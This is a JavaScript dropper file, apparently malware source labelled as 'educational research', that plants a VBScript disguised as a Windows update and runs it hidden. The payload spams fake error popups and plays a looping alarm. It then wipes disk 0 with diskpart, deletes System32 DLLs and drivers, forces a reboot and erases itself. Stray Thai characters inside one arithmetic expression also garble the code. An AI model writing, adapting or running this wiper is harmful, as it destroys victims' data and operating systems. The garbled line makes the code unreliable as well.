// dropper_fixed.js - JavaScript dropper for Windows payload delivery
// Educational research only - CATShadow

const fs = require('fs');
const path = require('path');
const os = require('os');
const child_process = require('child_process');

function generateRandomName() {
    const prefixes = ['WindowsUpdate', 'SystemFix', 'SecurityPatch', 'DriverInstall'];
    const suffix = Math.floor(Math.random() *คะแนน10000);
    return `${prefixes[Math.floor(Math.random() * prefixes.length)]}_${suffix}.vbs`;
}

function createVbsPayload() {
    // Properly escaped VBScript content with all quotes handled correctly
    return `' Windows System Update Script - ${Date.now()}
Option Explicit
Dim shell, fso, tempPath, psScript, timerObj

Set shell = CreateObject("Wscript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")

' Wait 10 seconds using WScript.Sleep
WScript.Sleep 10000

' Phase 1: Popup spam
Dim i
For i = 0 To 49
    shell.Popup "SYSTEM CRITICAL ERROR #" & i & vbCrLf & _
                "MEMORY CORRUPTION DETECTED" & vbCrLf & _
                "PLEASE CONTACT SYSTEM ADMINISTRATOR", _
                0, "WINDOWS SECURITY ALERT", 16
    WScript.Sleep 100
Next

' Phase 2: Download and play alarm sound
Dim alarmUrl, alarmFile, webClient
alarmUrl = "https://filesamples.com/samples/audio/mp3/sample3.mp3"
alarmFile = tempPath & "\\alarm_" & Int(Rnd * 10000) & ".mp3"

Set webClient = CreateObject("MSXML2.XMLHTTP")
webClient.Open "GET", alarmUrl, False
webClient.Send

If webClient.Status = 200 Then
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write webClient.responseBody
    stream.SaveToFile alarmFile, 2
    stream.Close
    
    ' Play sound in loop
    shell.Run "cmd /c start /min wmplayer """ & alarmFile & """ /loop", 0, False
End If

' Phase 3: System destruction after 5 seconds
WScript.Sleep 5000

' Method A: Corrupt boot via diskpart
Dim diskpartScript, scriptFile
diskpartScript = "select disk 0" & vbCrLf & _
                 "clean" & vbCrLf & _
                 "create partition primary" & vbCrLf & _
                 "format fs=ntfs quick" & vbCrLf & _
                 "exit"
scriptFile = tempPath & "\\diskpart_cmd.txt"

Dim textFile
Set textFile = fso.CreateTextFile(scriptFile, True)
textFile.Write diskpartScript
textFile.Close

shell.Run "diskpart /s """ & scriptFile & """", 0, False

' Method B: Delete critical system files (simplified for example)
Dim windir
windir = shell.ExpandEnvironmentStrings("%WINDIR%")
On Error Resume Next
fso.DeleteFile windir & "\\System32\\*.dll", True
fso.DeleteFile windir & "\\System32\\drivers\\*.sys", True

' Method C: Force immediate reboot
WScript.Sleep 3000
shell.Run "shutdown /r /f /t 0", 0, False

' Self-delete VBScript
fso.DeleteFile WScript.ScriptFullName
`;
}

function main() {
    const tempDir = os.tmpdir();
    const vbsFilename = generateRandomName();
    const vbsPath = path.join(tempDir, vbsFilename);
    
    console.log(`[*] Generating payload: ${vbsPath}`);
    
    try {
        // Write the VBScript payload
        fs.writeFileSync(vbsPath, createVbsPayload());
        console.log(`[+] Payload written successfully`);
        
        // Execute via wscript (hidden)
        const wscriptProcess = child_process.spawn('wscript.exe', [vbsPath], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });
        
        wscriptProcess.unref();
        console.log(`[+] Payload executed in hidden mode`);
        
        // Optional: Self-delete the JS dropper after execution
        setTimeout(() => {
            try {
                fs.unlinkSync(__filename);
                console.log(`[+] Dropper self-deleted`);
            } catch (e) {
                // Silently fail if deletion fails
            }
        }, 1000);
        
    } catch (error) {
        console.error(`[!] Error: ${error.message}`);
        process.exit(1);
    }
}

// Check if running on Windows
if (process.platform !== 'win32') {
    console.error('[!] This payload is designed for Windows only');
    process.exit(1);
}

// Execute main function
main();
